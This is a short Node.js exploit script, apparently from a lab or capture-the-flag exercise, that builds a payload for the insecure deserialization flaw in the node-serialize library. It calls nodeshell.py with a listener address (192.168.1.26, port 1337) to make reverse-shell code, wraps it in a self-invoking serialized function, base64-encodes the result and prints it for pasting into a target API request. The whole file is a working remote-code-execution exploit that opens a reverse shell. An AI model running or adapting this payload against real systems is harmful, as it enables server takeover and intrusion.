const { serialize } = require("node-serialize");
const { spawn } = require("child_process");

/**
 * Configuration: The exploit configuration
 * LHOST: LocalHost
 * LPORT: LocalPort
 * PAYLOAD: Request Payload for API
 */
const config = {
  LHOST: "192.168.1.26",
  LPORT: "1337",
  PAYLOAD: {
    word: "ansh",
  },
};

const revshell = spawn("python", ["nodeshell.py", config.LHOST, config.LPORT]);

revshell.stdout.on("data", (data) => {
  const parsed = Buffer.from(data).toString();
  console.log("OUTPUT PAYLOAD:");
  console.log("<<<=====COPY AS IT IS=====>>>");
  const serialized = serialize({
    ...config.PAYLOAD,
    rce: function () {},
  });
  console.log(parsed);
  const payloadInjected = Buffer.from(
    serialized.replace(`}"}`, `${parsed.trim()}}()"}`)
  ).toString("base64");
  console.log(payloadInjected);
  console.log("<<<=====COPY AS IT IS=====>>>");
});
revshell.stderr.on("data", (data) => {
  console.log(`ERROR: ${data}`);
});
revshell.on("close", (code) => {
  console.log(`nodeshell.py exited with code ${code}`);
});
